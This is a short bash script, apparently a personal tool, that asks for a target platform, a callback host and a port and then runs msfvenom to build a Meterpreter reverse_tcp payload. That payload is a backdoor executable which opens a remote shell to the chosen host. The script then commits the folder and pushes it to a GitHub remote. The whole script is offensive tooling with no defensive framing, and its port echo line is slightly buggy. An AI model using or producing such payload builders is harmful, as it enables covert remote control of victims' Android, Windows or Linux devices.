#!/bin/bash
echo "System Type (android/windows/linux)"
read s
echo "set Host"
read h
echo "set Port(80,443)"
read p
echo "OutPutName+Exstention"
read O
msfvenom -p  $s/meterpreter/reverse_tcp LHOST=$h LPORT=$p R >  ./$O

echo "Payload $O Created"
echo "------------------"
echo "Payload:$s"
echo "Host is :$h"
echo "Port: 5$p"
echo "------------------"

git init
git add .
git commit -m "Includes a script to create payload and to setup a Listener"
git remote  add origin  https://github.com/ivdimdev/ivdim
git remote -v 
git  push origin master
